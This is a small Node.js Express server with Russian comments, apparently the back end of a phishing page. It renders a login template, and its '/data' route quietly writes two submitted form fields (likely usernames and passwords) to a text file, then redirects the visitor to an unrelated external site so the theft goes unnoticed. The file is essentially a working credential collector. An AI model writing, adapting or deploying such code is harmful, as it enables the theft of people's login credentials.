const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 80;

const base64Encode = (text) => {
    // Кодируем текст в base64
    const encodedText = Buffer.from(text).toString('base64');
    return encodedText;
  };
  
  const base64Decode = (encodedText) => {
    // Декодируем текст из base64
    const decodedText = Buffer.from(encodedText, 'base64').toString('utf-8');
    return decodedText;
  };

// Устанавливаем шаблонизатор EJS
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Роут для "/start"
app.get('/login', (req, res) => {
  res.render('login'); // Отрисовываем страницу из файла start.ejs
});


  app.get('/data', (req, res) => {
    console.log(req)
    const input1Value = req.query.input1;
    const input2Value = req.query.input2;
  
    // Выводим полученные данные в консоль (в реальном приложении обработайте данные соответствующим образом)
    console.log('Received data:', { input1: input1Value, input2: input2Value });
    fs.appendFile("data.txt", JSON.stringify({ input1: input1Value, input2: input2Value })+" tscum \n", (err) => {
      if (err) {
        console.error('Ошибка при записи файла:', err);
        return;
      }
    });
  
    // Отправляем ответ обратно
    link = `https://afweek.mobirisesite.com/`
    res.redirect(link);
  });

  

// Обработка 404 ошибки (если роут не найден)
app.use((req, res) => {
    console.log(req)
  res.status(404).send('Page not found');
  //res.redirect(link);
});

// Запуск сервера
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
